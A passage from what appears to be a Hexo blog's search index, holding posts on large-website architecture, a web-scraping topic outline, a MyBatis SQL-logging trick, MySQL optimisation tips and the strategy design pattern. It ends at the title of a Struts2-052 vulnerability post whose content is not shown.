</ol>
<ul>
<li><p>When: Distributed Cache Cluster need be extension</p>
</li>
<li><p>Loading balance design advantage demand: Cache</p>
</li>
</ul>
<ol start="3">
<li>Distributed Cache Hash Algorithm</li>
</ol>
<ul>
<li><p><a class="link"   href="http://blog.csdn.net/cywosp/article/details/23397179/" >Note link<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
<li><p><a class="link"   href="https://www.zhihu.com/question/39311007/answer/80724939" >Discussion<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
</li>
</ul>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/dishash.png"
                      class="" title="hash theroy"
                >
<h4 id="Data-Storage-Server-Cluster-Design"><a href="#Data-Storage-Server-Cluster-Design" class="headerlink" title="Data Storage Server Cluster Design"></a>Data Storage Server Cluster Design</h4><ol>
<li><p>Schema Database Telescopic (Cobar, GreenPlum)</p>
</li>
<li><p>NoSQL Database(Apache HBase)</p>
</li>
</ol>
<h2 id="Site-Extensibility"><a href="#Site-Extensibility" class="headerlink" title="Site Extensibility"></a>Site Extensibility</h2><h4 id="Structure-Extensibility-Architecture"><a href="#Structure-Extensibility-Architecture" class="headerlink" title="Structure Extensibility Architecture"></a>Structure Extensibility Architecture</h4><blockquote>
<p>Module Coupling Decoupling</p>
</blockquote>
<h4 id="Distributed-Message-Queue"><a href="#Distributed-Message-Queue" class="headerlink" title="Distributed Message Queue"></a>Distributed Message Queue</h4><ol>
<li><p>Event Driven Architecture</p>
</li>
<li><p>Distributed Message Queue</p>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/disqueue.png"
                      class="" title="disqueue"
                ></li>
</ol>
<ul>
<li>ESB SOA</li>
</ul>
<h4 id="Reuse-Platform"><a href="#Reuse-Platform" class="headerlink" title="Reuse Platform"></a>Reuse Platform</h4><ul>
<li><p>Questions</p>
<ul>
<li><p>Compiling &amp; Deploy</p>
</li>
<li><p>Code Patch Manage Difficult</p>
</li>
<li><p>Database Connections Exhaustion </p>
</li>
<li><p>New Business Add Difficult</p>
</li>
</ul>
</li>
<li><p>Separate</p>
<ul>
<li><p>Vertical: various applications</p>
</li>
<li><p>Horizontal: distributed business</p>
</li>
</ul>
</li>
</ul>
<ol>
<li><p>Web Service &amp; Enterprise Service</p>
<ol>
<li><p>Server[WSDL] -&gt; Service Broker[UDDI] &lt;- SOAP [Client]</p>
</li>
<li><p>Disadvantages</p>
<ul>
<li><p>Bloat register and find management</p>
</li>
<li><p>Inefficient xml serializable method</p>
</li>
<li><p>Large spending Http connections</p>
</li>
<li><p>Complex deploy and maintenance method</p>
</li>
</ul>
</li>
</ol>
</li>
<li><p>Distributed Service demand and features</p>
</li>
</ol>
<ul>
<li><p>Loading balance, fail over, efficient long-distance communication</p>
</li>
<li><p>Heterogeneous systems, Minimum invasion to applications</p>
</li>
<li><p>Versions control, Real time monitor</p>
</li>
</ul>
<ol start="3">
<li>Distributed Service Framework Design</li>
</ol>
<ul>
<li><p>Dubbo(NIO communication)</p>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/dubbo.png"
                      class="" title="dubbo"
                ></li>
</ul>
<h4 id="Extensible-data-structure"><a href="#Extensible-data-structure" class="headerlink" title="Extensible data structure"></a>Extensible data structure</h4><ul>
<li>ColumnFamily</li>
</ul>
<h4 id="Open-platform-theory"><a href="#Open-platform-theory" class="headerlink" title="Open platform theory"></a>Open platform theory</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/open.png"
                      class="" title="open"
                >

<h3 id="Safety-Architecture"><a href="#Safety-Architecture" class="headerlink" title="Safety Architecture"></a>Safety Architecture</h3><ol>
<li>XSS</li>
</ol>
<ul>
<li><p>Filter escape character</p>
</li>
<li><p>HttpOnly</p>
</li>
</ul>
<ol start="2">
<li><p>Inject</p>
<ul>
<li>OPEN Sources, Error echo, Blinds, Filter escape, Args bind(OS injection)</li>
</ul>
</li>
<li><p>CSRF </p>
<ul>
<li>Form token, verify code, Refer check</li>
</ul>
</li>
<li><p>Others</p>
<ul>
<li>Error code, HTML annotation, file upload, traversal paths</li>
</ul>
</li>
<li><p>Web application firewall</p>
<ul>
<li>ModSecurity</li>
</ul>
</li>
<li><p>Web security scanner</p>
</li>
</ol>
<h4 id="Info-encryption-and-secret-key-management"><a href="#Info-encryption-and-secret-key-management" class="headerlink" title="Info encryption and secret key management"></a>Info encryption and secret key management</h4><ol>
<li><p>One-way hash encryption</p>
<ul>
<li>MD5, SHA</li>
</ul>
</li>
<li><p>Symmetric encryption</p>
<ul>
<li>DES, RC</li>
</ul>
</li>
<li><p>Asymmetric encryption</p>
<ul>
<li>Https, RSA</li>
</ul>
</li>
<li><p>Secret key management</p>
</li>
</ol>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/keynote.png"
                      class="" title="semanaget"
                >
<h4 id="Info-filter-amp-anti-spam"><a href="#Info-filter-amp-anti-spam" class="headerlink" title="Info filter &amp; anti-spam"></a>Info filter &amp; anti-spam</h4><ol>
<li>Text Match</li>
</ol>
<ul>
<li><p>Trie (base array: storage, check array: status)</p>
</li>
<li><p>Multilevel hash match</p>
</li>
</ul>
<ol start="2">
<li>Classify</li>
</ol>
<ul>
<li>Basyes(Advance) -&gt; TAN -&gt; ARCS</li>
</ul>
<ol start="3">
<li>Blacklist</li>
</ol>
<ul>
<li>Bloom Filter</li>
</ul>
<h4 id="Electronic-Commerce-Control"><a href="#Electronic-Commerce-Control" class="headerlink" title="Electronic Commerce Control"></a>Electronic Commerce Control</h4><ol>
<li>Risk</li>
</ol>
<ul>
<li>Account, Sellers, Buyers, Trade</li>
</ul>
<ol start="2">
<li>Risk control</li>
</ol>
<ul>
<li><p>rule engine</p>
</li>
<li><p>statistics model</p>
</li>
</ul>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><h3 id="TaoBao"><a href="#TaoBao" class="headerlink" title="TaoBao"></a>TaoBao</h3><h4 id="Evolution"><a href="#Evolution" class="headerlink" title="Evolution"></a>Evolution</h4><ol>
<li><p>Lamp</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/taoinit.png"
                      class="" title="lamp"
                >
</li>
<li><p>2004, eBay: Php-&gt;Java, Mysql-&gt;Oracle, MVC Webx, ORM: iBatis, Manage: antx, Server: Weblogic</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/2004tao.png"
                      class="" title="2004tao"
                ></li>
</ol>
<p><strong>Note: Taobao choose the free plan when the begin and choose the no free plan when speed up growing web. Both of them are the right decisions.</strong></p>
<ol start="3">
<li><p>abandon EJB, import spring; JBoss(Jetty further more) not Weblogic,  </p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/2006tao.png"
                      class="" title="2006tao"
                ></li>
</ol>
<p>At this moment, taobao begin to make progress, many technology which be their base was from that moment.</p>
   <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/taoopen.png"
                      class="" title="taopen"
                >
<h3 id="Wiki"><a href="#Wiki" class="headerlink" title="Wiki"></a>Wiki</h3><h4 id="The-whole-wiki"><a href="#The-whole-wiki" class="headerlink" title="The whole wiki"></a>The whole wiki</h4><ul>
<li>GeoDNS, LVS, Squid, Lighttpd, PHP, Memcached, Lucene, MySQL</li>
</ul>
<h4 id="Wiki-performance-optimise-strategy"><a href="#Wiki-performance-optimise-strategy" class="headerlink" title="Wiki performance optimise strategy"></a>Wiki performance optimise strategy</h4><ol>
<li>Front end</li>
</ol>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/wikifront.png"
                      class="" title="wikifront"
                >
<ol start="2">
<li>Server</li>
</ol>
<ul>
<li><p>APC</p>
</li>
<li><p>Imagemagick</p>
</li>
<li><p>Tex</p>
</li>
<li><p>replace strtr function</p>
</li>
</ul>
<ol start="3">
<li>Backstage</li>
</ol>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/wikiback.png"
                      class="" title="backwiki"
                >
<h3 id="Doris"><a href="#Doris" class="headerlink" title="Doris"></a>Doris</h3><h4 id="Solutions"><a href="#Solutions" class="headerlink" title="Solutions"></a>Solutions</h4><ol>
<li>Classify Faults</li>
</ol>
<ul>
<li>Instant, Temp, Forever</li>
</ul>
<ol start="2">
<li><p>Normal status access</p>
</li>
<li><p>Instant fault high availability solutions</p>
</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/instantfail.png"
                      class="" title="instant"
                >

<ol start="4">
<li>Temporary Error high availability solutions</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/temporaryfault.png"
                      class="" title="temp"
                >

<ol start="5">
<li>forever fault high availability solutions</li>
</ol>
<p>Machine can not distinguish between temp and forever.</p>
<p>So you need to find it artificial.</p>
<h3 id="Online-shopping-spike"><a href="#Online-shopping-spike" class="headerlink" title="Online shopping spike"></a>Online shopping spike</h3><h4 id="Challenges"><a href="#Challenges" class="headerlink" title="Challenges"></a>Challenges</h4><ol>
<li><p>Impact existing business</p>
</li>
<li><p>Application, Database loading</p>
</li>
<li><p>Tape width</p>
</li>
<li><p>Direct url</p>
</li>
</ol>
<h4 id="Strategy"><a href="#Strategy" class="headerlink" title="Strategy"></a>Strategy</h4><ol>
<li><p>Independent deploy</p>
</li>
<li><p>Page static(reduce request)</p>
</li>
<li><p>Rent tape width(CDN)</p>
</li>
<li><p>Dynamic generate random order page url</p>
</li>
</ol>
<h4 id="Architecture-Design"><a href="#Architecture-Design" class="headerlink" title="Architecture Design"></a>Architecture Design</h4><ol>
<li>Spike button control</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/spikebtn.png"
                      class="" title="spikebtn"
                >

<ol start="2">
<li>Spike process &amp; Architecture Design</li>
</ol>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/spikefinal.png"
                      class="" title="spikeprocess"
                >
<h3 id="Fault-example-analyze"><a href="#Fault-example-analyze" class="headerlink" title="Fault example analyze"></a>Fault example analyze</h3><h4 id="Log-cause-fault"><a href="#Log-cause-fault" class="headerlink" title="Log cause fault"></a>Log cause fault</h4><ul>
<li><p>Log output level: global debug</p>
</li>
<li><p>Experiences:</p>
<ul>
<li><p>Self log &amp; third party should be config individually</p>
</li>
<li><p>Config log level at least: warn, and check the output code call whether accord with real log level.</p>
</li>
<li><p>Shut down third party no use log(Most are error log)</p>
</li>
</ul>
</li>
</ul>
<h4 id="Highly-concurrent-access-database-cause-fault"><a href="#Highly-concurrent-access-database-cause-fault" class="headerlink" title="Highly concurrent access database cause fault"></a>Highly concurrent access database cause fault</h4><ul>
<li><p>Experiences:</p>
<ul>
<li><p>Home page should not access database</p>
</li>
<li><p>Home page had better as static</p>
</li>
</ul>
</li>
</ul>
<h4 id="Highly-concurrent-latch-cause-fault"><a href="#Highly-concurrent-latch-cause-fault" class="headerlink" title="Highly concurrent latch cause fault"></a>Highly concurrent latch cause fault</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/latchfault.png"
                      class="" title="latchfault"
                >

<h4 id="Cache-cause-fault"><a href="#Cache-cause-fault" class="headerlink" title="Cache cause fault"></a>Cache cause fault</h4><h4 id="Application-start-not-at-the-same-time"><a href="#Application-start-not-at-the-same-time" class="headerlink" title="Application start not at the same time"></a>Application start not at the same time</h4><ul>
<li><p>Apache, JBoss</p>
</li>
<li><p>JBoss start, then request it by curl. success: start Apache</p>
</li>
</ul>
<h4 id="I-x2F-O-Big-file-cause-disk"><a href="#I-x2F-O-Big-file-cause-disk" class="headerlink" title="I&#x2F;O Big file cause disk"></a>I&#x2F;O Big file cause disk</h4><ul>
<li>Tiny file should be storage themselves instead of sharing with distributed big file storage system.</li>
</ul>
<h4 id="Abuse-of-production-environment"><a href="#Abuse-of-production-environment" class="headerlink" title="Abuse of production environment"></a>Abuse of production environment</h4><ul>
<li>Access production environment should be regularly(DBA)</li>
</ul>
<h4 id="Non-standard-process"><a href="#Non-standard-process" class="headerlink" title="Non-standard process"></a>Non-standard process</h4><ul>
<li><p>Diff before you push the code</p>
</li>
<li><p>Stronger the code review</p>
</li>
</ul>
<h4 id="Code-habits"><a href="#Code-habits" class="headerlink" title="Code habits"></a>Code habits</h4><ul>
<li><p>Check the null pointer when you are not sure the input object status</p>
</li>
<li><p>Null object pattern</p>
</li>
</ul>
<h2 id="Architects"><a href="#Architects" class="headerlink" title="Architects"></a>Architects</h2><h3 id="Leader-Art"><a href="#Leader-Art" class="headerlink" title="Leader Art"></a>Leader Art</h3><h4 id="Man-not-Production"><a href="#Man-not-Production" class="headerlink" title="Man not Production"></a>Man not Production</h4><h4 id="Discover-the-excellence-of-man"><a href="#Discover-the-excellence-of-man" class="headerlink" title="Discover the excellence of man"></a>Discover the excellence of man</h4><h4 id="Share-the-blueprint"><a href="#Share-the-blueprint" class="headerlink" title="Share the blueprint"></a>Share the blueprint</h4><h4 id="Learn-to-compromise"><a href="#Learn-to-compromise" class="headerlink" title="Learn to compromise"></a>Learn to compromise</h4><h4 id="Engage-and-Develop-Others"><a href="#Engage-and-Develop-Others" class="headerlink" title="Engage and Develop Others"></a>Engage and Develop Others</h4><h3 id="Career-Raiders"><a href="#Career-Raiders" class="headerlink" title="Career Raiders"></a>Career Raiders</h3><h4 id="Find-questions"><a href="#Find-questions" class="headerlink" title="Find questions"></a>Find questions</h4><h4 id="Ask-questions-and-support"><a href="#Ask-questions-and-support" class="headerlink" title="Ask questions and support"></a>Ask questions and support</h4><h3 id="Site-architecture"><a href="#Site-architecture" class="headerlink" title="Site architecture"></a>Site architecture</h3><h4 id="Effect"><a href="#Effect" class="headerlink" title="Effect"></a>Effect</h4><ul>
<li>Design, Fire Fighting, Sermon, Geek</li>
</ul>
<h4 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h4><ul>
<li>Sherpa, Spartan, VIP</li>
</ul>
<h4 id="Duty"><a href="#Duty" class="headerlink" title="Duty"></a>Duty</h4><ul>
<li>Productions, Basic service, Basic equipment</li>
</ul>
<h4 id="Attention-Level"><a href="#Attention-Level" class="headerlink" title="Attention Level"></a>Attention Level</h4><ul>
<li>Function, Not function(Performance &amp; others), Team organization, Production Future, Production operative</li>
</ul>
<h4 id="Public-praise"><a href="#Public-praise" class="headerlink" title="Public praise"></a>Public praise</h4><ul>
<li>Best, good, normal, bad. worst</li>
</ul>
<h4 id="Non-mainstream"><a href="#Non-mainstream" class="headerlink" title="Non-mainstream"></a>Non-mainstream</h4><ul>
<li>Normal, Literature, 1+1</li>
</ul>
<h2 id="Appendix"><a href="#Appendix" class="headerlink" title="Appendix"></a>Appendix</h2><h3 id="Front-End"><a href="#Front-End" class="headerlink" title="Front End"></a>Front End</h3><ul>
<li><p>Browser optimise</p>
<ul>
<li>Cache, reduce Http, page compress</li>
</ul>
</li>
<li><p>CDN</p>
</li>
<li><p>Static resources should be storage in their own server cluster</p>
</li>
<li><p>Image(not logo… but the user upload like avatar)</p>
<ul>
<li>Own server &amp; child domain</li>
</ul>
</li>
<li><p>Reverse Proxy</p>
</li>
<li><p>DNS</p>
</li>
</ul>
<h3 id="Application-layer-architecture"><a href="#Application-layer-architecture" class="headerlink" title="Application layer architecture"></a>Application layer architecture</h3><ul>
<li><p>Development framework</p>
</li>
<li><p>Page Rendering</p>
</li>
<li><p>Loading balance </p>
</li>
<li><p>Session management</p>
</li>
<li><p>Dynamic page staticize</p>
</li>
<li><p>Business split</p>
</li>
<li><p>Virtual server</p>
</li>
</ul>
<h3 id="Service-layer-architecture"><a href="#Service-layer-architecture" class="headerlink" title="Service layer architecture"></a>Service layer architecture</h3><ul>
<li><p>Distributed message</p>
</li>
<li><p>Distributed service</p>
</li>
<li><p>Distributed cache</p>
</li>
<li><p>Distributed configuration</p>
</li>
</ul>
<h3 id="Storage-architecture"><a href="#Storage-architecture" class="headerlink" title="Storage architecture"></a>Storage architecture</h3><ul>
<li><p>Distributed files </p>
</li>
<li><p>Schema database</p>
</li>
<li><p>NoSQL database</p>
</li>
<li><p>Data synchronization</p>
</li>
</ul>
<h3 id="Backstage-architecture"><a href="#Backstage-architecture" class="headerlink" title="Backstage architecture"></a>Backstage architecture</h3><ul>
<li><p>Search engine</p>
</li>
<li><p>Data repositories</p>
</li>
<li><p>Recommend system</p>
</li>
</ul>
<h3 id="Data-collection-and-monitor"><a href="#Data-collection-and-monitor" class="headerlink" title="Data collection and monitor"></a>Data collection and monitor</h3><ul>
<li><p>Browser data collection</p>
</li>
<li><p>Server business data collection</p>
</li>
<li><p>Server performance collection</p>
</li>
<li><p>System monitor</p>
</li>
<li><p>System alert</p>
</li>
</ul>
<h3 id="Security-Architecture"><a href="#Security-Architecture" class="headerlink" title="Security Architecture"></a>Security Architecture</h3><ul>
<li><p>Web Attack</p>
</li>
<li><p>Data protection</p>
</li>
</ul>
<h3 id="Data-Center-architecture"><a href="#Data-Center-architecture" class="headerlink" title="Data Center architecture"></a>Data Center architecture</h3><ul>
<li><p>Computer room</p>
</li>
<li><p>Cabinet</p>
</li>
<li><p>Server architecture</p>
</li>
</ul>
<h2 id="Appendix-B"><a href="#Appendix-B" class="headerlink" title="Appendix B"></a>Appendix B</h2><ol>
<li><p>Web: only static html </p>
</li>
<li><p>CGI cause dynamic page content</p>
<ul>
<li><p>process like: server push the reuqest to cgi programmer, CGI computing and generate the html.</p>
</li>
<li><p>CGI use Perl, Java servlet call servlet in the web container.</p>
  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/cgi.png"
                      class="" title="cgi"
                >
</li>
<li><p>Php(Asp, Jsp) improve the situation which caused business code and page programmer coupling by CGI</p>
</li>
<li><p>MVC (combine cgi and web server)</p>
  <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2020/07/18/site-architechture/mvc.png"
                      class="" title="mvc"
                ></li>
</ul>
</li>
</ol>
<h2 id="Done"><a href="#Done" class="headerlink" title="Done"></a>Done</h2><p> - </p>
]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>Architecture</tag>
      </tags>
  </entry>
  <entry>
    <title>爬虫概览</title>
    <url>/2025/04/06/spider-note/</url>
    <content><![CDATA[<h2 id="基本知识"><a href="#基本知识" class="headerlink" title="基本知识"></a>基本知识</h2><h3 id="http-请求"><a href="#http-请求" class="headerlink" title="http 请求"></a>http 请求</h3><h3 id="curl-使用"><a href="#curl-使用" class="headerlink" title="curl 使用"></a>curl 使用</h3><h3 id="tls-握手包"><a href="#tls-握手包" class="headerlink" title="tls 握手包"></a>tls 握手包</h3><h3 id="charles-cipher-diff"><a href="#charles-cipher-diff" class="headerlink" title="charles (cipher diff)"></a>charles (cipher diff)</h3><h3 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h3><h3 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h3><h2 id="Web-反爬"><a href="#Web-反爬" class="headerlink" title="Web 反爬"></a>Web 反爬</h2><h3 id="ja3-ja4-http2-后端指纹"><a href="#ja3-ja4-http2-后端指纹" class="headerlink" title="ja3 ja4 http2 后端指纹"></a>ja3 ja4 http2 后端指纹</h3><h4 id="curl-impersonate"><a href="#curl-impersonate" class="headerlink" title="curl-impersonate"></a>curl-impersonate</h4><h3 id="前端指纹-canvas-font-webrtc"><a href="#前端指纹-canvas-font-webrtc" class="headerlink" title="前端指纹 canvas font webrtc"></a>前端指纹 canvas font webrtc</h3><h4 id="js-hook"><a href="#js-hook" class="headerlink" title="js hook"></a>js hook</h4><h4 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h4><h4 id="js混淆-AST-逆向"><a href="#js混淆-AST-逆向" class="headerlink" title="js混淆 AST 逆向"></a>js混淆 AST 逆向</h4><h4 id="chromium-编译"><a href="#chromium-编译" class="headerlink" title="chromium 编译"></a>chromium 编译</h4><h2 id="App-反爬"><a href="#App-反爬" class="headerlink" title="App 反爬"></a>App 反爬</h2><h3 id="frida-hook"><a href="#frida-hook" class="headerlink" title="frida hook"></a>frida hook</h3><h3 id="IDA-jadx-反编译"><a href="#IDA-jadx-反编译" class="headerlink" title="IDA jadx 反编译"></a>IDA jadx 反编译</h3>]]></content>
      <categories>
        <category>Spider</category>
      </categories>
      <tags>
        <tag>spider</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>sql打印的一种暴力解决方式</title>
    <url>/2021/01/23/sql-log-cheat/</url>
    <content><![CDATA[<h2 id="Sql-log-失效"><a href="#Sql-log-失效" class="headerlink" title="Sql log 失效"></a>Sql log 失效</h2><p>以 MyBatis 为例，因为其他辅助框架的不同，或者某些条件限制，导致日志按照官网配置后可能出现仍然无法打印的情况，这时候可能就会想到写sql拦截器自己拦截生成sql填充参数，但可能需要一定的开发时间。</p>
<p>本文直接挑明一种暴力打印的方式，不清楚是否广泛可用，但有兴趣的老哥们可以试一下。</p>
<h2 id="Java-类加载优先级"><a href="#Java-类加载优先级" class="headerlink" title="Java 类加载优先级"></a>Java 类加载优先级</h2><p>会按照 classpath 的顺序去加载，遇到 <code>全限定名相同的类</code> 时只会加载第一个，而 classpath 目录的默认值是  <code>.</code>， 也就是当前目录。</p>
<p>换句话说当项目跑起来的时候会优先加载自己写的 <code>class</code>， 这是暴力方法的基础。</p>
<h2 id="Sql的执行方法"><a href="#Sql的执行方法" class="headerlink" title="Sql的执行方法"></a>Sql的执行方法</h2><p>以 <code>MyBatis Mysql</code> 为例，一直 <code>debug</code> 跟踪到 <code>JDBC</code> 层会找到这个方法 <code>PrepareStatement.execute</code> 方法（批量执行对应的(<code>PrepareStatement.executeBatchInternal</code>)），最开始的时候在这里找到了生成最终 <code>payloadPacket</code> 估计就是客户端发送包里有sql， 后来转念一想这个类中应该有个差不多生成 <code>sql</code> 的方法，的确就是 <code>PrepareStatement.asSql</code> ，到这其实结合刚刚的Java加载优先级机制暴力的方法已经出来了。</p>
<h2 id="具体方案"><a href="#具体方案" class="headerlink" title="具体方案"></a>具体方案</h2><p>将<code>jdbc</code> 包中的 <code>souce code</code> 下载下来，（<code>jetbrains idea</code> 的话只需要点击下这个类的右上角有个 <code>download source</code> 的方法）下载成功后，按照该类包的路径在项目中创建一个同路径的包，然后将其放进去，同时修改 <code>PrepareStatement.execute</code>, 在其首部执行 <code>(log.info(asSql()))</code> 即可。（这里的 <code>log</code> 是 <code>lombok</code> 的<code>@SLF4J</code> 生成的，可以根据自己的喜好选择打印的方式）</p>
]]></content>
      <categories>
        <category>小技巧</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>Sql</tag>
        <tag>Mybatis</tag>
        <tag>Log</tag>
      </tags>
  </entry>
  <entry>
    <title>Sql Optimization</title>
    <url>/2020/07/04/sql-optimize/</url>
    <content><![CDATA[<h2 id="Sql-优化笔记"><a href="#Sql-优化笔记" class="headerlink" title="Sql 优化笔记"></a>Sql 优化笔记</h2><h3 id="大批量插入数据优化"><a href="#大批量插入数据优化" class="headerlink" title="大批量插入数据优化"></a>大批量插入数据优化</h3><ol>
<li><p>导入的数据按照主键的顺序保存</p>
</li>
<li><p>导入数据前执行SET UNIQUE_CHECKS&#x3D;0，关闭唯一性校验，带导入之后再打开设置为1：校验会消耗时间，在数据量大的情况下需要考虑。</p>
</li>
<li><p>导入前设置SET AUTOCOMMIT&#x3D;0，关闭自动提交，导入后结束再设置为1</p>
</li>
<li><p>尽量使用多个值表的 INSERT 语句，这种方式将大大缩减客户端与数据库之间的连接、关闭等消耗。</p>
</li>
<li><p>如果在不同客户端插入很多行，可使用INSERT DELAYED语句得到更高的速度，DELLAYED含义是让INSERT语句马上执行，其实数据都被放在内存的队列中。并没有真正写入磁盘。LOW_PRIORITY刚好相反。</p>
</li>
<li><p>将索引文件和数据文件分在不同的磁盘上存放</p>
</li>
<li><p>当从一个文本文件装载一个表时，使用LOAD DATA INFILE，通常比INSERT语句快20倍</p>
</li>
</ol>
<h3 id="Group-by"><a href="#Group-by" class="headerlink" title="Group by"></a>Group by</h3><ol>
<li>默认排序，不使用ORDER BY NULL时：有明显的Using filesort</li>
</ol>
<h3 id="Order-by"><a href="#Order-by" class="headerlink" title="Order by"></a>Order by</h3><ol>
<li><p>WHERE 条件和OREDR BY 使用相同的索引：即key_part1与key_part2是复合索引，where中使用复合索引中的key_part1</p>
<p> <code>SELECT*FROM user WHERE key_part1=1 ORDER BY key_part1 DESC, key_part2 DESC;</code></p>
</li>
<li><p>而且ORDER BY顺序和索引顺序相同：</p>
<p> <code>SELECT*FROM user ORDER BY key_part1, key_part2;</code></p>
</li>
<li><p>并且要么都是升序要么都是降序：</p>
<p> <code>SELECT*FROM user ORDER BY key_part1 DESC, key_part2 DESC;</code></p>
</li>
<li><p>但以下几种情况则不使用索引：</p>
</li>
</ol>
<ul>
<li><p>ORDER BY中混合ASC和DESC：</p>
<p> <code>SELECT*FROM user ORDER BY key_part1 DESC, key_part2 ASC;</code></p>
</li>
<li><p>查询行的关键字与ORDER BY所使用的不相同，即WHERE 后的字段与ORDER BY 后的字段是不一样的</p>
<p> <code>SELECT*FROM user WHERE key2 = ‘xxx’ ORDER BY key1;</code></p>
</li>
<li><p>ORDER BY对不同的关键字使用，即ORDER BY后的关键字不相同</p>
<p> <code>SELECT*FROM user ORDER BY key1, key2;</code></p>
</li>
</ul>
<h3 id="查询缓存"><a href="#查询缓存" class="headerlink" title="查询缓存"></a>查询缓存</h3><p>静态配置表等不是经常更新的表建议可用查询缓存</p>
<h3 id="Sql-执行过程"><a href="#Sql-执行过程" class="headerlink" title="Sql 执行过程"></a>Sql 执行过程</h3>]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>Sql</tag>
        <tag>Optimize</tag>
        <tag>Explain</tag>
      </tags>
  </entry>
  <entry>
    <title>Strategy Pattern</title>
    <url>/2017/05/14/strategypattern/</url>
    <content><![CDATA[<h4 id="Conception"><a href="#Conception" class="headerlink" title="Conception"></a><strong>Conception</strong></h4><ul>
<li>Strategy pattern (also known as the policy pattern) design pattern that enables an algorithm’s behavior to be selected at runtime.</li>
</ul>
<hr>
<h4 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a><strong>Intent</strong></h4><ul>
<li>Define a family of algorithms, encapsulate each one, and make them interchangeable.</li>
<li>Strategy lets the algorithm vary independently from the clients that use it.</li>
<li>Capture the abstraction in an interface, bury implementation details in derived classes.</li>
</ul>
<h4 id="Example"><a href="#Example" class="headerlink" title="Example"></a><strong>Example</strong></h4><ul>
<li>Here is the link <a class="link"   href="https://github.com/ReZeroS/DesignModel/tree/master/DesignModel/src/srcs/tactics" >Duck example<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
</ul>
<p>It has structure like this: <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="http://img.blog.csdn.net/20170512175842325?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZ2l0aHViXzM1OTU3MTg4/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast"
                      alt="Duck Class Graph"
                ></p>
<hr>
<p>The most important part of code should like this:</p>
<pre><code>Duck model = new ModelDuck();
model.performFly();
model.setFlyBehavior(new FlyRocketPowered());
model.performFly();
</code></pre>
<p>As you can see, we encapsulate the <strong>fly behavior(FlyRocketPowered)</strong> algorithm and set a method <strong>setFlyBehavior</strong> so you guys can change the behavior. The model was like a <strong>Context</strong> object which is in charge of interaction with <strong>Strategy</strong> class. So as this way, you can avoid most <strong>“if-else”</strong> of <strong>“switch”</strong>, you know what is my mean.</p>
<hr>
<h4 id="Advantages"><a href="#Advantages" class="headerlink" title="Advantages"></a><strong>Advantages</strong></h4><ul>
<li>Define a lot of algorithms to make the them can change easily.</li>
<li>To avoid much duplicate code.</li>
<li>To make it has good extension function.</li>
</ul>
<hr>
<h4 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a><strong>Problems</strong></h4><ul>
<li>The caller must understand the difference between each strategy and choose which strategy to use.</li>
<li>Can not Nested calls, since it suit for flat algorithm structure.</li>
<li>Add too much objects.</li>
</ul>
<hr>
<h4 id="Where"><a href="#Where" class="headerlink" title="Where"></a><strong>Where</strong></h4><ul>
<li>The class need to select one algorithm for dynamtic</li>
<li>The only differences between these classes is the behavior.</li>
<li>Keep the algorithm security and do not want the client know more about the complex data structure.</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>策略模式</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>(转) struts2-052漏洞</title>
    <url>/2017/09/06/struts2-052/</url>
